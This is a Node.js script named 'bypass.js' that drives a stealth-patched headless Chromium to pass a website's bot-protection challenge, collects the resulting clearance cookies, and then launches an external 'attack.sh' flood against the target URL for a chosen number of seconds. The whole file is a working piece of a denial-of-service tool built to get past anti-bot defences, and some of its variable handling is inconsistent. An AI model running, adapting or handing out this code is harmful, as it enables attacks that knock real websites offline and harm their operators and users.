var TARGET;
if(process.argv[2] === undefined){
    console.log("Wrong Usage!");
    console.log("Usage: node bypass.js target time");
    process.exit(3162);
} else {
    TARGET = process.argv[2].replace("\"", "");
    if(TARGET.includes("%RANDOMOM%")){
        if(process.argv.length < 8)
        {
            console.log("V1 Challenge");
            process.exit(3162);
        }
    }
}
var executablePath;
const os = require('os');
const osPlatform = os.platform();
if (/^win/i.test(osPlatform)) {
    executablePath = '';
}else if (/^linux/i.test(osPlatform)) {
    executablePath = '/usr/bin/chromium';
}
var RANDOMCOOKIE = process.argv[4];
var LENGTH = process.argv[5];
var COOKIES;
const {spawn} = require('child_process');
const chalk = require("chalk");
const EventEmitter = require('events');
const puppeteer = require('puppeteer-extra');
const sleep = require('sleep-promise');
puppeteer.use(require('puppeteer-extra-plugin-stealth')());

var BROWSER;
    
var INDEX_RANDOMOM;
if(TARGET.includes("%RANDOMOM%")){RANDOM = 1; BROWSER = TARGET.replace("%RANDOM%", ""); INDEX_RANDOM = TARGET.indexOf("%RANDOM%");}else{BROWSER = TARGET}
var THREADS = '1';
var TIME = process.argv[3];
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);
process.setMaxListeners(0);
EventEmitter.defaultMaxListeners = Infinity;
EventEmitter.prototype._maxListeners = Infinity;

async function challenge(){
    String.prototype.replaceBetween = function(start, end, what) {
        return this.substring(0, start) + what + this.substring(end);
    };
    console.log(chalk.blue(`Attack Started On ${TARGET} For ${TIME} Second`))

    const StealthPlugin = require('puppeteer-extra-plugin-stealth')
    puppeteer.use(StealthPlugin())
    puppeteer.launch({ headless: true , executablePath: executablePath, args: ['--disable-dev-shm-usage', '--ignore-certificate-errors', '--ignore-certificate-errors-spki-list', '--disable-gpu', '--headless', '--no-sandbox', '--disable-setuid-sandbox']}).then(async browser => {
        console.log(chalk.red("Just a moment..."));
        const page = await browser.newPage()
        await page.setJavaScriptEnabled(true);
        await page.waitForTimeout(10000)
        await page.goto(BROWSER, {waitUntil: 'domcontentloaded'})
        //await page.screenshot({ path: 'testresult.png', fullPage: true })
        await page.goto(BROWSER, {waitUntil: 'domcontentloaded'})
        //await page.screenshot({ path: 'testresult2.png', fullPage: true })
        COOKIES = await page.cookies()
        await browser.close()
        //console.log(COOKIES)
        for (i=0, len=COOKIES.length, F_COOKIES=""; i<len; i++){
            F_COOKIES += COOKIES[i]['name'] + ": " + COOKIES[i]['value'] + "; "
        }
        COOKIES = `\"${F_COOKIES}\"`
        console.log(COOKIES)
        for (i=0; i<THREADS; i++){
            console.log(`Attack Started...`)
            if (LENGTH === undefined){
                spawn('sh', [ "attack.sh", TARGET, TIME, 10]);
            }
            else{
                spawn('sh', [ "attack.sh", TARGET, TIME, 10]);
            }
        }
    });
}

challenge();